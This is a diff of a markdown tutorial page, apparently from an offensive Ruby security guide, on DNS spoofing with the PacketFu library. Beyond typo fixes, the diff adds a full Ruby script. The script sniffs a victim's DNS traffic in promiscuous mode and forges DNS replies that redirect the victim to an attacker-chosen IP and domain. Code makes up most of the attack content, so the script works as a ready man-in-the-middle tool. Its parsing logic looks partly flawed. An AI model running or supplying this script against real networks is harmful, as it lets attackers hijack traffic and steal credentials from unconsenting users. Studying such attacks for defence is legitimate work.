@@ -21,7 +21,7 @@ The same IPs of ARP spoof attack
 
 
 
-Now we cant intercept DNS Query packet coming from victim's machine. Since PacketFu supports filters in capturing (to reduce mount of captured packets) we'll use `udp and port 53 and host` filter, then we'll inspect the captured packet to ensure that it's a query then find the requested domain..........
+Now we cant intercept DNS Query packet coming from victim's machine. Since PacketFu supports filters in capturing (to reduce mount of captured packets) we'll use `udp and port 53 and host` filter, then we'll inspect the captured packet to ensure that it's a query then find the requested domain. [**Download DNS packet**][1].
 
 From wireshark, if we take a deeper look at the DNS query payload in `Domain Name System (query)`, we can see its been presented in hexdecimal format.
 
@@ -123,7 +123,7 @@ def readable(raw_domain)
   return fqdn.chomp!('.')
 end
 
-# * We need parse/analize the valide UDP packets only
+# * We need parse/analyze the valide UDP packets only
 # * We need to make sure this packet is a DNS query
 #
 # Find the DNS packets
@@ -149,20 +149,21 @@ capture.stream.each do |pkt|
   end
 end
 ```
-Till now we successfully finished [ARP Spoofing](module_0x3__network_kungfu/arp_spoofing.md) then DNS cupturing but still we need to replace/spoof the original response to our domain. eg. attacker.zone
-Great, now we have to build a DNS response instead of spoofed to be sent. So what we need?
+Till now we successfully finished [ARP Spoofing](module_0x3__network_kungfu/arp_spoofing.md) then DNS capturing but still we need to replace/spoof the original response to our domain. eg. attacker.zone, now we have to build a DNS response instead of spoofed to be sent. So what we need?
 
 * taking the IP we are going to redirect the user to (the spoofing_ip)
-    * converting it into hex using the to_i and pack functions.
-* From there we create a new UDP packet using the data contained in @ourInfo (IP and MAC) and fill in the normal UDP fields.
+    * converting it into hex using the `to_i` and `pack` methods.
+* From there we create a new UDP packet using the data contained in `@ourInfo` (IP and MAC) and fill in the normal UDP fields.
     * I take most of this information straight from the DNS Query packet.
 * The next step is to create the DNS Response.
-    * he best way to understand the code here is to look at a DNS header and then
+    * the best way to understand the code here is to look at a DNS header and then
     * take the bit map of the HEX values and apply them to the header.
     * This will let you see what flags are being set.
-* From here, we just calculate the checksum for the UDP packet and send it out to the target’s machine.
+* From here, we just calculate the checksum for the UDP packet and send it out to the target's machine.
 
-
+| ![Wireshark](dns_spoofing_wireshark2.png) |
+|:---------------:|
+| **Figure 2.** DNS Response Payload  |
 
 ```ruby
 
@@ -180,6 +181,113 @@ spoofing_ip.split('.').map {|octet| octet.to_i}.pack('c*')
 ```
 
 
+Wrapping up 
+
+```ruby
+#!/usr/bin/env ruby
+# -*- coding: binary -*-
+
+# Start the capture process
+require 'packetfu'
+require 'pp'
+include PacketFu
+
+
+def readable(raw_domain)
+  
+  # Prevent processing non domain
+  if raw_domain[0].ord == 0
+    puts "ERROR : THE RAW STARTS WITH 0"
+    return raw_domain[1..-1]
+  end
+
+  fqdn = ""
+  length_offset = raw_domain[0].ord
+  full_length   = raw_domain[ 0..length_offset ].length
+  domain_name   = raw_domain[(full_length - length_offset)..length_offset]
+
+  while length_offset != 0
+    fqdn << domain_name + "."
+    length_offset = raw_domain[full_length].ord
+    domain_name   = raw_domain[full_length + 1 .. full_length + length_offset]
+    full_length   = raw_domain[0 .. full_length + length_offset].length
+  end
+
+  return fqdn.chomp!('.')
+end
+
+#
+# Send Response
+#
+def spoof_response(packet, domain)
+
+  attackerdomain_name = 'rubyfu.net'
+  attackerdomain_ip   = '54.243.253.221'.split('.').map {|oct| oct.to_i}.pack('c*')  # Spoofing IP
+
+  # Build UDB packet
+  response = UDPPacket.new(:config => PacketFu::Utils.ifconfig("wlan0"))
+  response.udp_src   = packet.udp_dst             # source port
+  response.udp_dst   = packet.udp_src             # destination port
+  response.ip_saddr  = packet.ip_daddr            # modem's IP address to be source
+  response.ip_daddr  = packet.ip_saddr            # victim's IP address to be destination
+  response.eth_daddr = packet.eth_saddr           # the victim's MAC address
+  response.payload   = packet.payload[0,1]        # Transaction ID
+  response.payload  += "\x81\x80"                 # Flags: Reply code: No error (0)
+  response.payload  += "\x00\x01"                 # Question: 1
+  response.payload  += "\x00\x00"                 # Answer RRs: 0
+  response.payload  += "\x00\x00"                 # Authority RRs: 0
+  response.payload  += "\x00\x00"                 # Additional RRs: 0
+  response.payload  += attackerdomain_name.split('.').map do |section| # Queries | Name: , Convert domain to DNS style(the opposite of readable method)
+    [section.size.chr, section.chars.map {|c| '\x%x' % c.ord}.join]
+  end.join + "\x00"
+  response.payload  += "\x00\x01"                 # Queries | Type: A (Host address)
+  response.payload  += "\x00\x01"                 # Queries | Class: IN (0x0001)
+  response.payload  += "\xc0\x0c"                 # Answer | Name: twitter.com
+  response.payload  += "\x00\x01"                 # Answer | Type: A (Host address)
+  response.payload  += "\x00\x01"                 # Answer | Class: IN (0x0001)
+  response.payload  += "\x00\x00\x00\x25"         # Answer | Time to live: 37 seconds
+  response.payload  += "\x00\x04"                 # Answer | Data length: 4
+  response.payload  += attackerdomain_ip          # Answer | Addr
+  response.recalc                                 # Calculate the packet
+  response.to_w(response.iface)                   # Send the packet through our interface
+end
+
+filter = "udp and port 53 and host " + "192.168.0.21"
+@capture = Capture.new(:iface => "wlan0", :start => true, :promisc => true, :filter => filter, :save => true)
+# Find the DNS packets
+@capture.stream.each do |pkt|
+  # Make sure we can parse the packet; if we can, parse it
+  if UDPPacket.can_parse?(pkt)
+    packet = Packet.parse(pkt)
+
+    # Get the offset of the query type: (request=\x01\x00, response=\x81\x80)
+    dns_query = packet.payload[2..3].to_s
+
+    # Make sure we have a dns query packet
+    if dns_query == "\x01\x00"
+      # Get the domain name into a readable format
+      domain_name = packet.payload[12..-1].to_s # FULL DOMAIN
+      fqdn = readable(domain_name)
+      # Ignore non query packet
+      next if domain_name.nil?
+      puts "DNS request for: " + fqdn
+
+    end
+    # Make sure we have a dns reply packet
+    if dns_query == "\x81\x80"
+      domain_name = packet.payload[12..-1].to_s # FULL DOMAIN
+      fqdn = readable(domain_name)
+      puts "[*] Start Spoofing: " + fqdn
+      spoof_response packet, domain_name
+    end
+
+  end
+end 
+
+```
+
+
+
 
 https://github.com/SilverFoxx/Spoofa/blob/master/spoofa
 
@@ -187,6 +295,7 @@ Sources[^1] [^2] - The code has been modified and fixed
 
 <br><br><br>
 ---
+[1]: ../files/module03/dns_spoofing_dns-req_res.pcap.pcapng
 [^1]: [DNS Spoofing Using PacketFu](http://crushbeercrushcode.org/2012/10/ruby-dns-spoofing-using-packetfu/)
 [^2]: [Manipulating The Network with PacketFu](http://tuftsdev.github.io/DefenseOfTheDarkArts/assignments/manipulatingthenetworkwithpacketfu-110314111058-phpapp01.pdf)
 [^3]: [DNS Header Flags](http://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-12)
